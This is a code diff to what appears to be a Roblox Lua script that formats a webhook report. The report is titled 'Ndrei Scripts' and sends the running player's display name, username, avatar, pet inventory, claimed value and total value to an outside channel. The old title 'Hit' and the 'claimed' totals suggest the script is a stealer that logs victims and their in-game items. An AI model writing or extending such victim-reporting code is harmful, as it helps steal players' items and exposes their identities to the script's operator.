@@ -181,9 +181,34 @@ local data = {
     ["content"] = content,
     ["embeds"] = {
         {
-            ["title"] = "Hit",
-            ["description"] = "User: " .. LocalPlayer.Name .. "\nValue: " .. tostring(math.floor(vL_weight + 0.5)) .. "\n" .. invString,
-            ["color"] = 0x05f7ff
+            ["title"] = "🔥 Ndrei Scripts",
+            ["color"] = 0x05f7ff,
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(LocalPlayer.UserId) .. "&width=420&height=420&format=png"
+            },
+            ["fields"] = {
+                {
+                    ["name"] = "🔷 Display Name",
+                    ["value"] = LocalPlayer.DisplayName,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🆔 Username",
+                    ["value"] = LocalPlayer.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🐾 Inventory (" .. petCount .. " pets)",
+                    ["value"] = invString .. "\n" .. string.rep("=", 30)
+                        .. "\nTotal claimed: " .. string.format("%.2f", totalClaimed)
+                        .. " / " .. string.format("%.2f", totalValue),
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Value: " .. tostring(math.floor(vL_weight + 0.5))
+            },
+            ["timestamp"] = DateTime.now():ToIsoDate()
         }
     }
 }
